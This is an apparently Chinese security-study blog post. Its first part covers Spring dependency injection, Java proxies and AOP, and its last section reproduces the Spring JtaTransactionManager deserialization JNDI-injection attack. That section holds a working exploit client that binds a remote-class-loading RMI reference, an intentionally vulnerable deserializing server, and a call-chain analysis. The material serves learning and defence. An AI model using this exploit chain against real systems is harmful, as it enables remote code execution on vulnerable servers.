+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sw.action.DI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDI</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ApplicationContext actx = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">    <span class="string">"config-di.xml"</span>);</span><br><span class="line">  DI di = (DI) actx.getBean(<span class="string">"di"</span>);</span><br><span class="line">  <span class="comment">// 打印这些集合</span></span><br><span class="line">  System.out.println(di.getList());</span><br><span class="line">  System.out.println(di.getSet());</span><br><span class="line">  System.out.println(di.getMap());</span><br><span class="line">  System.out.println(di.getPro());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Spring-AOP思想"><a href="#Spring-AOP思想" class="headerlink" title="Spring AOP思想"></a>Spring AOP思想</h3><p>在写AOP前先先来写下三种Java中的代理：静态代理，动态代理，CGLIB代理</p>
+<ul>
+<li>静态代理：<strong>静态代理需要实现目标对象的相同接口，那么可能会导致代理类会非常非常多，维护起来相对麻烦</strong></li>
+<li>动态代理：<strong>目标对象一定是要有接口的，没有接口就不能实现动态代理</strong></li>
+<li>cglib代理：<strong>为了解决动态代理一定需要接口的问题，通过cglib代理代理的对象不需要接口</strong></li>
+</ul>
+<h4 id="手动实现AOP编程"><a href="#手动实现AOP编程" class="headerlink" title="手动实现AOP编程"></a>手动实现AOP编程</h4><p>IUser接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AOP类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代理工厂</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//维护目标对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//维护关键点代码的类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AOP aop;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProxyInstance</span><span class="params">(Object target_, AOP aop_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标对象和关键点代码的类都是通过外界传递进来</span></span><br><span class="line">        target = target_;</span><br><span class="line">        aop = aop_;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(),</span><br><span class="line">                <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">                        aop.begin();</span><br><span class="line">                        Object returnValue = method.invoke(target, args);</span><br><span class="line">                        aop.close();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> returnValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="注解方式实现AOP"><a href="#注解方式实现AOP" class="headerlink" title="注解方式实现AOP"></a>注解方式实现AOP</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"aa"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启aop注解方式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>切面类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//指定为切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AOP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//里面的值为切入点表达式</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"开始事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"execution(* aa.*.*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"关闭事务"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现接口的UserDao类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">implements</span> <span class="title">IUser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"DB:保存用户"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext ac =</span><br><span class="line">                <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"aa/applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里得到的是代理对象....</span></span><br><span class="line">        IUser iUser = (IUser) ac.getBean(<span class="string">"userDao"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(iUser.getClass());</span><br><span class="line"></span><br><span class="line">        iUser.save();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="通过JNDI注入实现Spring-Framework反序列化"><a href="#通过JNDI注入实现Spring-Framework反序列化" class="headerlink" title="通过JNDI注入实现Spring Framework反序列化"></a>通过JNDI注入实现Spring Framework反序列化</h3><p>漏洞复现项目：</p>
+<p><a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
+<p>Client端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">      String localAddress= <span class="string">"127.0.0.1"</span>;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">      Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">      Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">      ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">      registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">      Socket socket = <span class="keyword">new</span> Socket(localAddress,port);</span><br><span class="line">      System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">      String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line"></span><br><span class="line">      org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">      object.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">      ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">      objectOutputStream.writeObject(object);</span><br><span class="line">      objectOutputStream.flush();</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Server端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">			System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line">			<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">				Socket socket=serverSocket.accept();</span><br><span class="line">				System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());</span><br><span class="line">				ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Object object = objectInputStream.readObject();</span><br><span class="line">					System.out.println(<span class="string">"Read object "</span>+object);</span><br><span class="line">				&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">					System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地8000端口开启Web服务，并将ExportObject.class放在Web服务下</p>
+<p>先运行Server端，再运行Client端</p>
+<p><img src="https://s2.ax1x.com/2020/03/06/3b5BGt.png" alt="3b5BGt.png"></p>
+<h4 id="漏洞调用链分析"><a href="#漏洞调用链分析" class="headerlink" title="漏洞调用链分析"></a>漏洞调用链分析</h4><p>跟进org.springframework.transaction.jta.JtaTransactionManager下readobject方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">    <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">    initUserTransactionAndTransactionManager();</span><br><span class="line">    initTransactionSynchronizationRegistry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进initUserTransactionAndTransactionManager()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA UserTransaction from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">			<span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.userTransaction = retrieveUserTransaction();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction at its default JNDI location.</span></span><br><span class="line">				<span class="keyword">this</span>.userTransaction = findUserTransaction();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="comment">// Fetch JTA TransactionManager from JNDI, if necessary.</span></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.transactionManagerName)) &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = lookupTransactionManager(<span class="keyword">this</span>.transactionManagerName);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.transactionManager = retrieveTransactionManager();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.transactionManager == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectTransactionManager) &#123;</span><br><span class="line">				<span class="comment">// Autodetect UserTransaction object that implements TransactionManager,</span></span><br><span class="line">				<span class="comment">// and check fallback JNDI locations otherwise.</span></span><br><span class="line">				<span class="keyword">this</span>.transactionManager = findTransactionManager(<span class="keyword">this</span>.userTransaction);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If only JTA TransactionManager specified, create UserTransaction handle for it.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">this</span>.userTransaction = buildUserTransaction(<span class="keyword">this</span>.transactionManager);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进lookupUserTransaction函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> getJndiTemplate().lookup(userTransactionName, UserTransaction<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(</span><br><span class="line">				<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, ex);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着跟进getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</p>
+<p>进一步跟进lookup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">			Object located = ctx.lookup(name);</span><br><span class="line">			<span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(</span><br><span class="line">						<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> located;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个lookup函数正是造成JNDI注入的lookup函数，在调用链中，我们可以通过userTransactionName属性值进行JNDI注入，而在client端，我们可以通过调用setUserTransactionName()函数去设置这个属性值，将其设置为我们的userTransactionName属性值，也就是我们设置的恶意RMI服务，进而造成JNDI注入。</p>
+<p><strong>最根本的原因也就是在于org.springframework.transaction.jta.JtaTransactionManager类对readObject方法进行了重写，对JDNI注入中的lookup函数进行调用，而lookup的参数我们是可以控制的，所以会导致通过反序列化导致JNDI注入。</strong></p>
+<p>PS：吐槽一下..在家学习效率可真太低了…一天的量感觉得分四五天…</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=b34e385ed716edf6f58998ec329f9867&amp;chksm=ebd74333dca0ca257a77c02ab458300ef982adff3cf37eb6d8d2f985f11df5cc07ef17f659d4#rd</a></p>
+<p><a href="https://segmentfault.com/a/1190000011291179" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011291179</a></p>
+<p><a href="https://blog.csdn.net/Mr_Ming_/article/details/80556066" target="_blank" rel="noopener">https://blog.csdn.net/Mr_Ming_/article/details/80556066</a></p>
+<p><a href="https://www.cnblogs.com/xdp-gacl/p/4249939.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/4249939.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
